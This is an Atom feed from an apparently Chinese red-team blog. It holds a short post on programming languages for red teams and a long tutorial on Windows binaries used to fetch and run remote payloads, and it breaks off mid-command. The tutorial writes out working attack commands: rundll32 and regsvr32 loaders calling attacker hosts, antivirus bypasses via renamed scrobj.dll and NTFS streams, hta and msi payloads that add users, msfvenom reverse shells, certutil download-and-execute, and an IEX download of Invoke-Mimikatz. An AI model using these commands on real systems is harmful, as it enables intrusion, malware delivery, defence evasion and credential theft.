<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sm0nk&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-07-27T07:27:56.718Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sm0nk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>红队vs编程语言</title>
    <link href="http://yoursite.com/2021/07/27/%E7%BA%A2%E9%98%9Fvs%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    <id>http://yoursite.com/2021/07/27/红队vs编程语言/</id>
    <published>2021-07-27T07:08:55.000Z</published>
    <updated>2021-07-27T07:27:56.718Z</updated>
    
    <content type="html"><![CDATA[<p>语言与红队：</p><p>1.目前企业成熟架构Java居多（Java也比较擅长处理业务逻辑），包括目前红队前渗透，漏洞RCE也多集中在Java反序，当然PHP（CMS&amp;CTF）和.Net有他专属空间；</p><a id="more"></a><p>2.Python虽然总体势头好、适配广，但对于对于Web开发漏洞挖掘方向还有很大空间；</p><p>3.可能随着云架构微服务 JS配Nodejs安全成为创新突破点；</p><p>4.移动安全的发展利好Kotlin，当然Java还是大哥，但漏洞方向多集中在客户端，不是红队getshell首选；</p><p>5.漏洞利用和工具开发：py go 效率更高，Ruby也挺好；</p><p>6.Win免杀，还得看c c++ c#，当然在混淆和算法加持下loader可以任意语言，甚至越小众越有利，但毕竟生命周期短；</p><p>7.内网方向，由于window的占比，Csharp亲儿子更香、汇编二进制来升华。</p><p>8.对于攻击手来讲，也没那么复杂，喜欢哪个用哪个。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;语言与红队：&lt;/p&gt;
&lt;p&gt;1.目前企业成熟架构Java居多（Java也比较擅长处理业务逻辑），包括目前红队前渗透，漏洞RCE也多集中在Java反序，当然PHP（CMS&amp;amp;CTF）和.Net有他专属空间；&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="语言安全" scheme="http://yoursite.com/tags/%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>windows远程加载Payload代码执行归纳总结</title>
    <link href="http://yoursite.com/2020/09/08/Windows%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDPayload%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/09/08/Windows远程加载Payload代码执行归纳总结/</id>
    <published>2020-09-08T07:55:15.000Z</published>
    <updated>2021-07-27T07:46:24.140Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="概览说明">概览说明</span></h1><p>总体来讲高频使用的上线方法包括powershell、rundll32 、regsvr32、mshta，其他根据具体场景进行结合利用（参考免杀），像powershell、wmi都是综合的专题。类似powershell downloadstring、mshta、rundll32 都可以实现内存加载，无文件落地。</p><a id="more"></a><!-- toc --><ul><li><a href="#命令详解">命令详解</a><ul><li><a href="#rundll32">rundll32</a></li><li><a href="#regsvr32">regsvr32</a><ul><li><a href="#远程加载sct文件">远程加载sct文件</a></li><li><a href="#dll上线">dll上线</a></li><li><a href="#bypass">bypass</a></li></ul></li><li><a href="#mshta">mshta</a><ul><li><a href="#基础说明">基础说明</a></li><li><a href="#jsvbs">Js&amp;vbs</a></li><li><a href="#正常上线">正常上线</a></li><li><a href="#注意事项">注意事项</a></li><li><a href="#报错类">报错类</a></li></ul></li><li><a href="#msiexec">msiexec</a></li><li><a href="#wmic">wmic</a></li><li><a href="#ieexec"><strong>IEExec</strong></a></li><li><a href="#pubprnvbs">pubprn.vbs</a></li><li><a href="#certutil">certutil</a></li><li><a href="#bitsadmin">bitsadmin</a></li><li><a href="#regasmregsvc">regasm&amp;regsvc</a></li><li><a href="#msxslexe">MSXSL.EXE</a></li><li><a href="#windows-wget">windows-wget</a></li><li><a href="#ftp">FTP</a></li><li><a href="#powershell">powershell</a></li><li><a href="#unc">UNC</a><ul><li><a href="#ipc">ipc$</a></li><li><a href="#copy">copy</a></li><li><a href="#cmdexe">cmd.exe</a></li><li><a href="#msbuild">msbuild</a></li><li><a href="#odbcconf">odbcconf</a></li><li><a href="#cscript">cscript</a></li><li><a href="#pcalua">pcalua</a></li></ul></li></ul></li><li><a href="#参考">参考</a><ul><li><a href="#url">URL</a></li><li><a href="#init">INIT</a></li></ul></li></ul><!-- tocstop --><h1><span id="命令详解">命令详解</span></h1><h2><span id="rundll32">rundll32</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</span><br><span class="line">项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git</span><br><span class="line"></span><br><span class="line">步骤一：开始运行JSRat，监听本地8888端口。</span><br><span class="line">步骤二：通过url访问，可以查看恶意代码。</span><br><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;</span><br><span class="line">步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</span><br></pre></td></tr></table></figure><p><img src="image-20210716151511033.png" alt="image-20210716151511033"></p><p><img src="image-20210716151521639.png" alt="image-20210716151521639"></p><p>参考：<a href="https://github.com/3gstudent/Javascript-Backdoor" target="_blank" rel="noopener">https://github.com/3gstudent/Javascript-Backdoor</a></p><p>Rundll32还可以用来调用某些内联脚本：</p><p><em>未成功</em></p><p><em>其中，负责执行网络调用的是rundll32.exe，而命令会将下载的Payload文件写入到IE本地缓存之中。</em></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct");this.close()</span><br></pre></td></tr></table></figure><p><img src="image-20210720091200285.png" alt="image-20210720091200285"></p><h2><span id="regsvr32">regsvr32</span></h2><h3><span id="远程加载sct文件">远程加载sct文件</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</span><br><span class="line">在目标机上执行：</span><br><span class="line">regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</span><br><span class="line">regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll</span><br><span class="line">regsvr32 /u /s /i:http://site.com/js.png scrobj.dll</span><br><span class="line"></span><br><span class="line">可以通过自己构造.sct文件;js.png也是如此，去下载执行我们的程序</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>XML version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span></span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">"ShortJSRAT"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">"&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &lt;![CDATA[</span></span><br><span class="line"><span class="undefined">            ps  = "cmd.exe /c calc.exe";</span></span><br><span class="line"><span class="undefined">            new ActiveXObject("WScript.Shell").Run(ps,0,true);</span></span><br><span class="line"><span class="undefined">        ]]&gt;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20210715183100996.png" alt="image-20210715183100996"></p><h3><span id="dll上线">dll上线</span></h3><p>regsvr32 artifact16.dll</p><p><em>But 有个弹窗, 点击确定后就掉线了</em>    </p><p><img src="image-20210716172006457.png" alt="image-20210716172006457"></p><h3><span id="bypass">bypass</span></h3><p>一般杀软 拦截情况为：http和scrobj.dll的组合</p><p>改个名字可以绕过，但是记得操作的时候在链接的dll目录下进行！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe /i:http://example.com/file.sct /u /s Myscrobj.dll</span><br></pre></td></tr></table></figure><ul><li>改变 scrobj.dll 的名称</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\scrobj.dll NothingToSeeHere.dll</span><br><span class="line">Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct NothingToSeeHere.dll</span><br></pre></td></tr></table></figure><ul><li>为 scrobj.dll 创建符号链接</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mklink Dave_LovesThis.dll c:\windows\system32\scrobj.dll</span><br><span class="line">Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Dave_LovesThis.dll</span><br></pre></td></tr></table></figure><ul><li>利用 NTFS ADS 功能绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type c:\Windows\System32\scrobj.dll &gt; Just_A_Normal_TextFile.txt:PlacingTheDLLHere</span><br><span class="line">Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Just_A_Normal_TextFile.txt:PlacingTheDLLHere</span><br></pre></td></tr></table></figure><ul><li>先将 sct 文件放到本地，然后执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer download /download /priority normal https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct %TEMP%\test.txt &amp;&amp; regsvr32.exe /s /u /i:%TEMP%\test.txt scrobj.dllRegsvr32.exe /u /s /i:Regsvr32_calc.sct scrobj.dll</span><br></pre></td></tr></table></figure><ul><li>直接调用scrobj.dll的DllInstall方法</li></ul><blockquote><p>其实可以不用regsvr32.exe，使用他的目的是因为他是 windows 自带的，有微软签名，如果不考虑这个的情况下其实可以写程序直接调用 scrobj.dll 的 DllInstall 方法实现代码执行。C#代码如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using System;using System.Reflection;using System.Runtime.InteropServices;using System.ComponentModel;namespace scrobj_call_csharp&#123;    static class NativeMethod    &#123;        [DllImport(&quot;kernel32&quot;, SetLastError = true, CharSet = CharSet.Ansi)]        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);        [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);    &#125;    class Program    &#123;        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]        private delegate Int32 DllInstall(Boolean bInstall, String pszCmdLine);        static void Main(string[] args)        &#123;            const string dllPath = &quot;scrobj.dll&quot;;            IntPtr hDllScr = NativeMethod.LoadLibrary(dllPath);            if (hDllScr == IntPtr.Zero)            &#123;                var lasterror = Marshal.GetLastWin32Error();                var innerEx = new Win32Exception(lasterror);                innerEx.Data.Add(&quot;LastWin32Error&quot;, lasterror);                throw new Exception(&quot;Can&apos;t load Dll &quot; + dllPath, innerEx);            &#125;            IntPtr DllInstallProcAddr = NativeMethod.GetProcAddress(hDllScr, &quot;DllInstall&quot;);            DllInstall fDllInstall = (DllInstall)Marshal.GetDelegateForFunctionPointer(DllInstallProcAddr, typeof(DllInstall));            fDllInstall(false, &quot;http://192.168.50.129:80/payload.sct&quot;);        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>成功调用scrobj.dll的DllInstall 方法实现代码执行。</p><h2><span id="mshta">mshta</span></h2><h3><span id="基础说明">基础说明</span></h3><p>实际上，mshta跟cscript/wscript是一类的，但是它还可以执行内联脚本，我们可以通过内联脚本来下载并执行Payload代码：</p><h3><span id="jsampvbs">Js&amp;vbs</span></h3><p>它支持命令行参数，可以接收JS和VBS的方法。看示例（在命令行下测试）：</p><p>JS:</p><blockquote><p>mshta vbscript:window.execScript(“alert(‘hello world!’);”,”javascript”)</p></blockquote><p>VBS:</p><blockquote><p>mshta javascript:window.execScript(“msgBox(‘hello world!’):window.close”,”vbs”)</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta vbscript:Close(Execute("GetObject(""script:http://192.168.214.1:6677/sct.sct"")"))</span><br></pre></td></tr></table></figure><p>ps:<em>有请求，但并未执行。</em></p><h3><span id="正常上线">正常上线</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。mshta http://192.168.28.128/run.htarun.hta内容如下：<span class="tag">&lt;<span class="name">HTML</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"VBScript"</span>&gt;</span><span class="undefined">Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject("Wscript.Shell")objShell.Run "cmd.exe /c net user test password /add" // 这里填写命令self.close</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span> <span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CS自带的powershell的 html application</p><p><img src="image-20210719235358971.png" alt="image-20210719235358971"></p><h3><span id="注意事项">注意事项</span></h3><p>mshta支持<code>http</code>和<code>htpps</code></p><p>但mshta在执行hta脚本时，类似于浏览器，会根据链接返回头进行对应的解析操作，所以这里只有当返回头为html时才会运行</p><p>否则会被当普通文本进行解析</p><p>对于github的代码，返回的格式为<code>text/plain</code></p><p>如果使用如下命令执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta https:<span class="comment">//raw.githubusercontent.com/3gstudent/test/master/calc.hta</span></span><br></pre></td></tr></table></figure><p>会把代码当成<code>text</code>，无法解析成html，导致脚本无法执行</p><p>但是我们可以换一个思路：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将hta文件传到github的博客下面，就能够被解析成html，实现代码执行</span><br></pre></td></tr></table></figure><p>将hta文件上传至github博客下面，地址为<a href="https://3gstudent.github.io/test/calc.hta" target="_blank" rel="noopener">https://3gstudent.github.io/test/calc.hta</a></p><p>执行如下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta https:<span class="comment">//3gstudent.github.io/test/calc.hta</span></span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="image-20210720092417656.png" alt="image-20210720092417656"></p><h3><span id="报错类">报错类</span></h3><p>弹框提示此计算机上的安全设置禁止访问其它域的数据源，如下图</p><p><img src="image-20210720092934150.png" alt="image-20210720092934150"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解决方法：IE浏览器<span class="string">`-`</span>Internet选项<span class="string">`-`</span>安全选择<span class="string">`可信站点`</span>，添加博客地址：https:<span class="comment">//3gstudent.github.io/自定义级别`，找到`通过域访问数据源`，选择`启用IE浏览器默认会拦截vbs脚本实现的下载功能</span></span><br></pre></td></tr></table></figure><h2><span id="msiexec">msiexec</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于安装Windows Installer安装包，可远程执行msi文件。#生成msi包msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi &gt; evil.msi#远程执行msiexec /q /i http://192.168.28.128/evil.msi</span><br></pre></td></tr></table></figure><h2><span id="wmic">wmic</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行WMIC以下命令从远程服务器下载并运行恶意XSL文件：wmic os get /FORMAT:"http://192.168.28.128/evil.xsl"</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span>      <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>      <span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span>      <span class="attr">xmlns:user</span>=<span class="string">"http://mycompany.com/mynamespace"</span>&gt;</span><span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">language</span>=<span class="string">"JScript"</span> <span class="attr">implements-prefix</span>=<span class="string">"user"</span>&gt;</span>   function xml(nodelist) &#123;var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f http://lyshark.com/shell.exe");        var r = new ActiveXObject("WScript.Shell").Run("shell.exe");        return nodelist.nextNode().xml;   &#125;<span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span>   <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"user:xml(.)"</span>/&gt;</span><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="image-20210726231746676.png" alt="image-20210726231746676"></p><p><img src="image-20210726231704103.png" alt="image-20210726231704103"></p><h2><span id="ieexec"><strong>IEExec</strong></span></h2><p>需要管理员权限</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。生成Payload：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe使用管理员身份打开cmd，分别运行下面两条命令。C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s offC:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe</span><br></pre></td></tr></table></figure><p>win7 测试失败</p><p><img src="image-20210720100539953.png" alt="image-20210720100539953"></p><p>Win10 下载exe，执行需要单独命令</p><p>下载到缓存目录</p><p>C:\Users\xx\AppData\Local\Microsoft\Windows\INetCache\IE\K1C3JB46</p><p><img src="image-20210720100917134.png" alt="image-20210720100917134"></p><p><img src="image-20210720101604731.png" alt="image-20210720101604731"></p><h2><span id="pubprnvbs">pubprn.vbs</span></h2><p>在Windows  7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本，可以利用来解析.sct脚本："C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent."C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sctcscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1  script:http://192.168.214.1:6677/sct.sct</span><br></pre></td></tr></table></figure><p>test.sct</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>XML version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span><span class="tag">&lt;<span class="name">registration</span>    <span class="attr">description</span>=<span class="string">"Bandit"</span>    <span class="attr">progid</span>=<span class="string">"Bandit"</span>    <span class="attr">version</span>=<span class="string">"1.00"</span>    <span class="attr">classid</span>=<span class="string">"&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;"</span>    <span class="attr">remotable</span>=<span class="string">"true"</span>    &gt;</span><span class="tag">&lt;/<span class="name">registration</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span><span class="xml">&lt;![CDATA[        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><h2><span id="certutil">certutil</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。注：缓存目录为：”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”#下载文件certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php#删除缓存certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64应用,可以将exe base64编号后，通过命令行写进去，然后还原回来。certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dllcertutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</span><br></pre></td></tr></table></figure><h2><span id="bitsadmin">bitsadmin</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt</span><br></pre></td></tr></table></figure><p>（只能命令下载到指定路径上，win7以上;使用bitsadmin的下载速度较慢）</p><h2><span id="regasmampregsvc">regasm&amp;regsvc</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll</span><br></pre></td></tr></table></figure><p>不能URL， 只能UNC 、 Webdav</p><p><img src="image-20210717103421131.png" alt="image-20210717103421131"></p><h2><span id="msxslexe">MSXSL.EXE</span></h2><p>需要单独下载安装，不合适。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xslwin10,默认 安全设置不允许在此样式表内执行脚本代码。</span><br></pre></td></tr></table></figure><p><img src="image-20210717104132728.png" alt="image-20210717104132728"></p><p>Demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="php"><span class="meta">&lt;?</span>xml-stylesheet type=<span class="string">"text/xsl"</span> href=<span class="string">"exec.xsl"</span> <span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">customers</span>&gt;</span><span class="tag">&lt;<span class="name">customer</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">customer</span>&gt;</span><span class="tag">&lt;/<span class="name">customers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exec.xsl</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span><span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span><span class="attr">xmlns:user</span>=<span class="string">"http://mycompany.com/mynamespace"</span>&gt;</span><span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">language</span>=<span class="string">"JScript"</span> <span class="attr">implements-prefix</span>=<span class="string">"user"</span>&gt;</span>   function xml(nodelist) &#123;var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");   return nodelist.nextNode().xml;   &#125;<span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span>   <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"user:xml(.)"</span>/&gt;</span><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h2><span id="windows-wget">windows-wget</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。wget.exe下载：https://eternallybored.org/misc/wget/wget -O "evil.txt" http://192.168.28.128/imag/evil.txt</span><br></pre></td></tr></table></figure><h2><span id="ftp">FTP</span></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。ftp 127.0.0.1usernamepasswordget fileexit</span><br></pre></td></tr></table></figure><p>可以考虑脚本化自动下载功能</p><h2><span id="powershell">powershell</span></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程下载文件保存在本地：powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'</span>); Invoke-Mimikatzpowershell -exec bypass -f 